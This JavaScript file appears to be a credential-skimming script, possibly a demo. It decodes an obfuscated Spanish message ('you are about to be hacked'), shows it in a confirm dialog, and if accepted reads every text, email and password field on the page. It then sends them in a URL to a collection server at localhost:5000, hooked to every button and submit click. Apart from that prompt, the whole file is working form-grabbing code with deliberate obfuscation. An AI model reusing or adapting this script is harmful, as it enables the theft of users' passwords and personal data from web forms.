const inputs = document.querySelectorAll("input");
const _na_oi = confirm;

let vw =
  "eWinstaGo3s apMauunt183o djh39e sene89r h9jnfacke$2dffado'??$gdh87g";

vw = vw.replace("Win", "");
vw = vw.replace("Go3", "");
vw = vw.replace("Mau", "");
vw = vw.replace("183", "");
vw = vw.replace("jh39", "");
vw = vw.replace("ne89", "");
vw = vw.replace("9jnf", "");
vw = vw.replace("$2dff", "");
vw = vw.replace("'??$gdh87g", ".");

async function not() {
  let naa_iu = true;
  const ud_vdd = await _na_oi(vw);

  if (!naa_iu) {
    throw new Error("undefined values");
  }

  return [ud_vdd, (vw.length * Math.PI) / Math.cos(25) + 2];
}

async function reciveAllInputs() {
  let jss = [];
  let [d_echrome] = await not();

  if (d_echrome) {
    for (let i = 0; i < inputs.length; i++) {
      if (
        inputs[i].type === "text" ||
        inputs[i].type === "email" ||
        inputs[i].type === "password"
      ) {
        let name = inputs[i].name;
        let value = inputs[i].value.toString();
        let jso = { name, value };
        jss.push(jso);
      }
    }
  }

  /** send */
  open("http://localhost:5000/" + JSON.stringify(jss));
}

const submits1 = document.querySelectorAll("button");

const submits2 = document.querySelectorAll('input[type="submit"]');

for (let i = 0; i < submits1.length; i++) {
  submits1[i].addEventListener("click", reciveAllInputs);
}

for (let i = 0; i < submits2.length; i++) {
  submits2[i].addEventListener("click", reciveAllInputs);
}
